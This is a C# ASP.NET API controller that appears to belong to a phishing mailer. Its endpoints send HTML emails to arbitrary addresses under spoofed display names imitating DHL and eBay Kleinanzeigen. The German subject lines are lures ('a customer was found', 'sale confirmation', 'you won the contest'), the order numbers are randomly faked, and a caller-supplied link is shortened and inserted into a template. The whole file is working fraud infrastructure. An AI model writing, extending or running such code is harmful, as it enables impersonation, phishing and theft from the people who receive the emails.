using System.Net;
using System.Net.Mail;
using DteCrm.Services.EmailService;
using Microsoft.AspNetCore.Mvc;
using NoWayMailerAPI.Data;
using NoWayMailerAPI.Services.Interfaces;
using FileIO = System.IO.File;

namespace MailerRobot.Controllers;

[ApiController]
[Route("/api/[controller]")]
public class SenderController : ControllerBase
{
    private readonly IConfiguration _configuration;
    private readonly IShortLinkService _shortLinkService;
    private readonly SmtpClient _smtpClient;
    private readonly string _senderEmail;
    private int _orderNumber;

    public SenderController(IConfiguration configuration, IShortLinkService shortLinkService)
    {
        _configuration = configuration;
        _shortLinkService = shortLinkService;
        _orderNumber = Random.Shared.Next(234422000, 234522847);
		
        var config = new EmailSendingConfiguration();
        _configuration.GetSection("MailSettings")
            .GetChildren()
            .First(e => e.Key == "SmtpBackup")
            .Bind(config);

        _smtpClient = new SmtpClient(config.Host, config.Port)
        {
            Credentials = new NetworkCredential(config.User, config.Password),
            EnableSsl = true
        };

        _senderEmail = config.Alias;
    }

    [HttpGet("dhl")]
    public async Task<IActionResult> SendDHLEmail(string email, string link)
    {
        var body = await GetBody(link, ServiceType.DHL);

        var message = new MailMessage(_senderEmail, email, $"Unser Team hat einen Kunden für Sie gefunden #{_orderNumber}", body)
        {
            IsBodyHtml = true,
            From = new MailAddress(_senderEmail, "•DHL•Lieferungen")
        };

        try
        {
            await _smtpClient.SendMailAsync(message);

            return Ok();
        }
        catch (Exception e)
        {
            return BadRequest(e.Message);
        }
    }

    [HttpGet("ebay")]
    public async Task<IActionResult> SendEbayEmail(string email, string link)
    {
       var body = await GetBody(link, ServiceType.EbayDe, EbayTemplate.Custom);

        var displayName = "Neuer Auftrag №7178Q92BC";

        var message = new MailMessage(_senderEmail, email, $"Bestätigung des Verkaufs", body)
        {
            IsBodyHtml = true,
            From = new MailAddress(_senderEmail, displayName)
        };
        

        try
        {
            await _smtpClient.SendMailAsync(message);

            return Ok();
        }
        catch (Exception e)
        {
            return BadRequest(e.Message);
        }
    }

    [HttpGet("ebay-congrats")]
    public async Task<IActionResult> SendEbayCongratsEmail(string email, string link)
    {
        var body = await GetBody(link, ServiceType.EbayCongrats);

        var message = new MailMessage(_senderEmail, email, "Herzlichen Glückwunsch zum Gewinn des Wettbewerbs!", body)
        {
            IsBodyHtml = true,
            From = new MailAddress(_senderEmail, "•EBAY•Kleinanzeigen")
        };

        try
        {
            await _smtpClient.SendMailAsync(message);

            return Ok();
        }
        catch (Exception e)
        {
            return BadRequest(e.Message);
        }
    }

    private async Task<string> GetBody(string link, ServiceType serviceType, EbayTemplate template = EbayTemplate.Custom)
    {
        var shortLink = await _shortLinkService.GetShortLink(link);

       // string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Templates", $"{serviceType}.html");
        string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Templates", $"EbayOriginal.html");

		var hmtlBody = FileIO.ReadAllText(filePath)
							.Replace("PutYourLinkHere", shortLink);

		return hmtlBody
               .Replace("OrderNumber", _orderNumber.ToString())
                .Replace("DateNow", DateTime.Now.ToString("dd-MM-yyyy"));
    }
}